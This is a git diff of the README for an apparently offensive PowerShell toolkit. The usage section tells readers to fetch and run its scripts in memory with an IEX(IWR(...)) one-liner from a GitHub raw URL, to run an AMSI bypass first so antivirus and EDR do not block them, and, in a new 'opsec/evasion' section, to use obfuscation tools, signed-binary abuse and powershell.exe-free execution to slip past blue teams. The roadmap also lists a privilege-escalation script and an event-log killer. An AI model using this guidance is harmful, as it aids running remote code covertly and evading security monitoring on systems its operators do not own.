@@ -6,6 +6,7 @@ All these scripts are made available for educational purposes only. Using them w
 They are all provided without warranty and they may or may not break things. You are responsible of the scripts you run.
 
 # usage
+
 All the scripts can be used locally but since we're using powershell and we're trying to be sneaky it is probably better to load them from a webserver using the classic IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/thescriptyouwant.ps1')) or on your very own webserver if you prefer
 
 You should definitely start by invoking:
@@ -14,6 +15,34 @@ IEX(IWR('https://raw.githubusercontent.com/RaouzRouik/smallposh/main/amsibp-dec-
 
 or else AV/EDR will surely block you right away!
 
+# opsec/evasion
+
+If you want to pull a sneaky on Blue Team/Soc, you should give a look at the following:
+
+paper:
+
+https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/
+
+tools:
+
+https://github.com/danielbohannon/Invoke-Obfuscation
+
+https://github.com/tokyoneon/Chimera
+
+http://www.powertheshell.com/
+
+https://github.com/klezVirus/inceptor
+
+Of course, for most of the tasks, you don't need to use powershell and you can use signed ms binaries:
+
+https://lolbas-project.github.io/
+
+Also there's a few ways to run powershell without powershell.exe:
+
+https://www.ired.team/offensive-security/code-execution/powershell-without-powershell
+
+
+
 
 # roadmap
 
@@ -21,11 +50,7 @@ Add extra doc on usage
 
 Add a privesc script that will go wmic qfe
 
-Add obfuscated version of each script so the blue team have less fun with their logs
-
 Add an eventlogkiller (maybe)
-
-Add a small PE/.Net injector/in-memory loader
 
 
 
